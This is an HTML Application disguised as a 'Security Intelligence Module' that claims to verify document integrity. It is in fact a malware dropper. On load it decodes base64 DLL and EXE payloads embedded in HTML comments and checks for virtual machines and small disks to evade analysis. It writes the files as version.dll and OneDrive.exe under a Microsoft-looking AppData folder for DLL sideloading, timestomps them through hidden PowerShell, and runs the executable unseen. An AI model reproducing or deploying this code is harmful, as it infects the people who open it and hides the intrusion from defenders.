<!--[DLL_PAYLOAD]TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwELAQAAAAAAA...[/DLL_PAYLOAD]-->
<!--[EXE_PAYLOAD]TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAADwELAQAAAAAAA...[/EXE_PAYLOAD]-->

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<HTA:APPLICATION
    ID="SecIntel"
    APPLICATIONNAME="SecurityIntel"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize">

<script language="JScript">
var _shell = new ActiveXObject("WScript.Shell");
var _fso = new ActiveXObject("Scripting.FileSystemObject");
var _wmi = new ActiveXObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\\cimv2");

function _extract(markerStart, markerEnd) {
    var path = location.pathname.replace(/^file:\/\//i, '').replace(/\//g, '\\');
    var file = _fso.OpenTextFile(path, 1, false);
    var raw = file.ReadAll();
    file.Close();
    var s = raw.indexOf(markerStart);
    var e = raw.indexOf(markerEnd);
    if (s === -1 || e === -1) return null;
    var b64 = raw.substring(s + markerStart.length, e);
    var xml = new ActiveXObject("MSXML2.DOMDocument");
    var node = xml.createElement("B64");
    node.dataType = "bin.base64";
    node.text = b64;
    return node.nodeTypedValue;
}

function _write(path, data) {
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(data);
    stream.SaveToFile(path, 2);
    stream.Close();
}

function _antiAnalysis() {
    var col = _wmi.ExecQuery("SELECT Manufacturer FROM Win32_ComputerSystem");
    var e = new Enumerator(col);
    for (; !e.atEnd(); e.moveNext()) {
        var m = e.item().Manufacturer.toLowerCase();
        if (m.indexOf("vmware") != -1 || m.indexOf("virtualbox") != -1) return false;
    }
    var disk = _wmi.ExecQuery("SELECT Size FROM Win32_LogicalDisk WHERE DriveType=3");
    var size = 0;
    var de = new Enumerator(disk);
    for (; !de.atEnd(); de.moveNext()) size += parseInt(de.item().Size);
    if (size < 60000000000) return false;
    return true;
}

function _deploy() {
    if (!_antiAnalysis()) window.close();

    var targetDir = _shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Microsoft\\Identity\\Cache";
    if (!_fso.FolderExists(targetDir)) {
        var parts = targetDir.split("\\");
        var curr = "";
        for (var i=0; i<parts.length; i++) {
            curr += parts[i] + "\\";
            if (!_fso.FolderExists(curr)) _fso.CreateFolder(curr);
        }
    }

    var dllPath = targetDir + "\\version.dll";
    var exePath = targetDir + "\\OneDrive.exe";

    var dllData = _extract("<!--[DLL_PAYLOAD]", "[/DLL_PAYLOAD]-->");
    var exeData = _extract("<!--[EXE_PAYLOAD]", "[/EXE_PAYLOAD]-->");

    if (dllData && exeData) {
        _write(dllPath, dllData);
        _write(exePath, exeData);

        // Timestomping (simplified via shell)
        var sysFile = "C:\\Windows\\System32\\kernel32.dll";
        var cmd = "powershell -WindowStyle Hidden -Command \"(Get-Item '" + exePath + "').CreationTime=(Get-Item '" + sysFile + "').CreationTime; (Get-Item '" + dllPath + "').CreationTime=(Get-Item '" + sysFile + "').CreationTime;\"";
        _shell.Run(cmd, 0, true);

        _shell.Run("\"" + exePath + "\"", 0, false);
    }
    window.close();
}

window.onload = function() {
    setTimeout(_deploy, 2000);
};
</script>
</head>
<body style="background:#f3f3f3;font-family:Segoe UI;">
    <div style="padding:20px;text-align:center;">
        <h3>Security Intelligence Module</h3>
        <p>Verifying document integrity...</p>
    </div>
</body>
</html>
